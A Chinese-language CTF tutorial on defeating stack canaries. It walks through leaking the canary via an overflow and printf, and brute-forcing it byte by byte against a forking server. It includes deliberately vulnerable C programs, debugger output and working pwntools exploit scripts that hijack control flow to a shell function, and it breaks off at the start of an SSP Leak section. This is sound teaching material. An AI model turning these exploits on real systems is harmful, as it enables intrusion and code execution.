# Canary

## 简介

一种防护栈溢出的保护机制；栈溢出的主要利用过程就是通过填充数据覆盖存在于栈上的局部变量，并溢出至ebp和eip等，从而劫持程序控制流；在未开启栈溢出保护的时候，可以通过覆盖返回地址来达到执行shellcode的目的；如果开启栈保护，在函数调用的时候(执行时),会往栈中插入类似于cookie的信息，当函数返回的时候会验证cookie信息是否合法，即在栈销毁之前测试该值是否发生改变；如果不合法，表示栈溢出发生，会立即停止程序的执行。攻击者在利用栈溢出的时候会将该cookie信息覆盖掉，但程序在返回检查该值的时候能够发现发生栈溢出，故导致攻击者利用失败。

Linux中的Canary和Windows中的GS都是有效缓解栈溢出的手段

## 原理

## 绕过技术

### 泄露栈中的Canary

#### 原理

Canary是以字节\x00结尾，这样的目的是能够保证canary能够截断字符串；这也给泄露带来了遍历，可以通过覆盖canary低字节来打印剩余部分的canary。

#### 条件

+ 存在栈溢出漏洞
+ 可以将栈中的可控变量输出

下面例子就能够达到条件：存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程

#### 利用

代码：

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

编译：

```
gcc -m32 -no-pie -g -o canary1 canary1.c
```

查看保护

```
dililearngent@dililearngent-virtual-machine:~/Desktop/CTF/pwn/stack/canary$ checksec canary1
[*] '/home/dililearngent/Desktop/CTF/pwn/stack/canary/canary1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先gdb调试一下，由于buf只有100，在readline发送时会加上0a，所以这里输入的时候输入99个a，这样就不会将0a溢出至canary

```
pwndbg> stack 50
00:0000│ esp 0xffffcf30 —▸ 0xf7fb2d20 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0004│     0xffffcf34 ◂— 0x0
02:0008│ ecx 0xffffcf38 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
... ↓        23 skipped
1a:0068│     0xffffcf98 ◂— 'aaa\n'
1b:006c│     0xffffcf9c ◂— 0xd2b3ec00                         //canary
1c:0070│     0xffffcfa0 —▸ 0x804a010 ◂— 'Hello Hacker!'
1d:0074│     0xffffcfa4 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf08 (_DYNAMIC) ◂— 0x1
1e:0078│ ebp 0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
1f:007c│     0xffffcfac —▸ 0x804936d (main+58) ◂— 0xb8
20:0080│     0xffffcfb0 —▸ 0xffffcfd0 ◂— 0x1
```

可以发现每次进程启动的canary值都不一样；现在需要将canary的值泄露出来，因为这里存在栈溢出和格式化字符串漏洞，这样可以将canary当作buf的一部分进行输出

构造exp：

```
#-*- codingLutf-8 -*-
from pwn import *

context(os='linux',arch='amd64',log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
p = process('./canary1')
e = ELF('./canary1')
get_shell = e.sym['getshell']
#1 leak canary
p.recvuntil('Hello Hacker!')
payload = 'a'*100
p.sendline(payload)

p.recvuntil('a'*100)
canary = u32(p.recv(4))-0xa
log.info("Canary:"+hex(canary))

#bypass canary
payload = 'a'*100+p32(canary)+'a'*8+'a'*4+p32(get_shell)
p.sendline(payload)
p.interactive()
```

首先解释为什么第一个payload需要输入100个a，跟gdb调试的时候不一致？

因为printf碰到换行符会将缓冲区的字符输出，然后刷新缓冲区；输入100个a的原因正是将sendline添加的换行符溢出到canary的低字节，这样在printf输出的时候将100个a放到缓冲区后不会输出，会继续读取canary，由于小端存储，故会将canary的值也添加到缓冲区，再碰到换行，输出缓冲区的内容，这也是为什么在接受到输出后会减去0xa得到真实的canary(这里溢出的0xa占用canary的低字节，不会影响里面的值，因为canary低字节为00)

为什么第二个payload中间需要填充12个a？

观察加入canary后栈中的分配即可得到答案，前8个a是填充canary到ebp的8字节距离，而后面的4个a是填充esp

### 爆破Canary

#### 原理

**每次进程重启的Canary不同，但是同一个进程中的不同线程的Canary是相同的，并且通过fork创建的子进程的Canary是相同的**

#### 例题

查看保护:

```
dililearngent@dililearngent-virtual-machine:~/Desktop/CTF/pwn/stack/canary$ checksec bin1
[*] '/home/dililearngent/Desktop/CTF/pwn/stack/canary/bin1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

分析程序：

查看main函数：

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __pid_t v3; // [sp+Ch] [bp-Ch]@2

  init();
  while ( 1 )
  {
    v3 = fork();       //调用fork函数
    if ( v3 < 0 )
      break;
    if ( v3 )         //父进程
    {
      wait(0);
    }
    else              //子进程
    {
      puts("welcome");
      fun();          //栈溢出漏洞存在这里
      puts("recv sucess");
    }
  }
  puts("fork error");
  exit(0);
}
```

查看fun函数：

```
int fun()
{
  char buf; // [sp+8h] [bp-70h]@1
  int v2; // [sp+6Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  read(0, &buf, 0x78u);            //栈溢出漏洞
  return *MK_FP(__GS__, 20) ^ v2;
}
```

根据程序分析可以得到buf的大小为100

思路：看到程序开启了Canary和NX，然后程序中又有fork函数，可以利用爆破Canary来解决问题

gdb调试查看一下Canary的值：

```
pwndbg> stack 50
00:0000│ esp 0xffffcf20 ◂— 0x0
01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
02:0008│     0xffffcf28 ◂— 0x78 /* 'x' */
03:000c│     0xffffcf2c —▸ 0xf7e45013 (_IO_file_overflow+275) ◂— add    esp, 0x10
04:0010│     0xffffcf30 —▸ 0xf7fb2d20 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│     0xffffcf34 —▸ 0xf7fb2d67 (_IO_2_1_stdout_+71) ◂— 0xfb3f880a
06:0018│ ecx 0xffffcf38 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
... ↓        23 skipped
1e:0078│     0xffffcf98 ◂— 'aaa\n'
1f:007c│     0xffffcf9c ◂— 0xaddaf400        //Canary
20:0080│     0xffffcfa0 —▸ 0x8048863 ◂— 0x636c6577 /* 'welcome' */
21:0084│     0xffffcfa4 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
```

继续运行，再次输入发现里面的Canary的值没有发生改变，这正是**通过 fork 函数创建的子进程的 Canary 与父进程是相同**

编写exp：

```
# -*- coding:utf-8 -*-
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p = process('./bin1')
e = ELF('./bin1')

p.recvuntil('welcome\n')
canary = '\x00'

for i in range(3):
    for i in range(256):
        p.send('a'*100+canary+chr(i))
        message = p.recvuntil('welcome\n')
        if 'recv' in message:
            canary+=chr(i)
            break

getflag_addr = e.sym['getflag']
payload = 100*'a'+canary+8*'a'+4*'a'+p32(getflag_addr)
p.sendline(payload)
p.interactive()
```

如果canary不正确，就会输出检测到堆溢出的信息，如果canary正确，会输出成功信息，并继续下一字节的爆破，由于32位的canary有4字节，故需要爆破3次

```
[DEBUG] Sent 0x68 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  00 61 41 d1 //爆破的最后一步                            │aaaa│·aA·│
    00000068
```

### SSP Leak

#### 原理

Stack Smashing Protect Leak，这种方法能够获取内存中的值，但是无法拿到shell

#### 例题

检查保护：

```
dililearngent@dililearngent-virtual-machine:~/Desktop/CTF/pwn/stack/canary$ checksec bin2
[*] '/home/dililearngent/Desktop/CTF/pwn/stack/canary/bin2'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```







